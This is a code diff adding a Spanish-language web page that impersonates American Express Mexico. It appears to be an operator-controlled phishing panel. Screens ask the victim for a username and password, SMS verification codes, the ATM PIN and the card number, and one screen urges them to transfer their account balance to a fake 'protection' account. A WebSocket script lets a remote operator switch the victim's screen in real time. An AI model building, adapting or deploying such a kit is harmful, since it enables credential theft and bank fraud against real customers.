@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>AMEX - Panel Dinámico</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #fff; margin: 0; padding: 0; text-align: center; }
+    .pantalla { display: none; padding: 40px; }
+    .activa { display: block; }
+    .footer, .header { background-color: #0077C8; color: white; padding: 10px; }
+    .card { max-width: 400px; margin: 50px auto; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); background: white; }
+    input, button { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+    button { background-color: #0077C8; color: white; border: none; cursor: pointer; }
+    button:hover { background-color: #005fa3; }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="https://logos-world.net/wp-content/uploads/2020/11/American-Express-Logo.png" alt="AMEX" width="200">
+    <p>7 de abril de 2025</p>
+  </div>
+
+  <div id="folio" class="pantalla activa card">
+    <h3>Folio de soporte:</h3>
+    <p>Por favor, ingrese el folio de soporte técnico que su ejecutivo en línea le proporcionó.</p>
+    <input type="text" placeholder="Ingrese su número de folio">
+    <button>Ingresar</button>
+  </div>
+
+  <div id="login" class="pantalla card">
+    <h3>Inicio de sesión:</h3>
+    <p>Por favor, ingrese su usuario y contraseña.</p>
+    <input type="text" placeholder="Ingrese su usuario">
+    <input type="password" placeholder="Ingrese su contraseña">
+    <button>Ingresar</button>
+  </div>
+
+  <div id="codigo" class="pantalla card">
+    <h3>Hemos enviado un código de verificación</h3>
+    <p>Ingresa el código que recibiste en tu número celular terminación: 8877</p>
+    <input type="text" placeholder="Ingrese el SMS recibido">
+    <button>Continuar</button>
+  </div>
+
+  <div id="nip" class="pantalla card">
+    <h3>Ingrese su NIP de confirmación</h3>
+    <p>Para confirmar la cancelación de su cargo no reconocido, por favor ingrese su NIP, este es el mismo que ingresa al utilizar nuestra red de cajeros automáticos.</p>
+    <input type="password" placeholder="NIP de confirmación">
+    <button>Validar</button>
+  </div>
+
+  <div id="proteger" class="pantalla card">
+    <h3>Es necesario proteger su saldo</h3>
+    <p>Por su seguridad, es necesario proteger el saldo de su cuenta efectivo, crearemos una cuenta de SU TOTAL PROTECCIÓN de forma gratuita para poder respaldar el fondo disponible en ésta.</p>
+    <p>Saldo sin proteger: $</p>
+  </div>
+
+  <div id="transferir" class="pantalla card">
+    <h3>Cuenta SU TOTAL PROTECCIÓN creada exitosamente.</h3>
+    <p>Con el fin de proteger su saldo disponible es necesario transferir la cantidad de $ a la siguiente cuenta SU TOTAL PROTECCIÓN (STP).</p>
+    <p><strong>Alias:</strong> Cuenta de respaldo.</p>
+    <p>Esta ventana se actualizará una vez reconozcamos que se haya transferido el saldo a su cuenta de respaldo.</p>
+  </div>
+
+  <div id="adicional" class="pantalla card">
+    <h3>Protección adicional</h3>
+    <p>Con el fin de evitar intentos de compra en línea, agregaremos protección adicional a su tarjeta de crédito/débito.</p>
+    <input type="text" placeholder="Número de tarjeta">
+    <button>Continuar</button>
+  </div>
+
+  <div id="cancelacion" class="pantalla card">
+    <h3>Cancelación de cargos:</h3>
+    <p>El código que recibiste para autorizar una compra en línea, es el mismo para realizar la cancelación. Lo hemos enviado a tu teléfono con terminación: 8877</p>
+    <input type="text" placeholder="Ingrese el SMS recibido">
+    <button>Continuar</button>
+  </div>
+
+  <div id="exitosa" class="pantalla card">
+    <h3>Cancelación exitosa</h3>
+    <p>Estimado cliente, hemos realizado la cancelación de su cargo no reconocido de forma exitosa.</p>
+    <p><strong>Comercio:</strong><br><strong>Monto devuelto:</strong> $</p>
+    <p>En un lapso no mayor a 72 horas, el monto devuelto volverá a estar disponible en su tarjeta de crédito/débito.</p>
+  </div>
+
+  <div class="footer">
+    <p>© AMEX México 2024. Todos los Derechos Reservados</p>
+    <p><a href="#">Aprende más</a> | <a href="#">Ayuda</a> | <a href="#">Términos y condiciones</a> | <a href="#">Seguridad en línea</a></p>
+  </div>
+
+  <script>
+    const ws = new WebSocket("ws://localhost:3000");
+
+    ws.onmessage = (event) => {
+      const pantalla = event.data.trim();
+      document.querySelectorAll('.pantalla').forEach(p => p.classList.remove('activa'));
+      const target = document.getElementById(pantalla);
+      if (target) target.classList.add('activa');
+    };
+  </script>
+</body>
+</html>
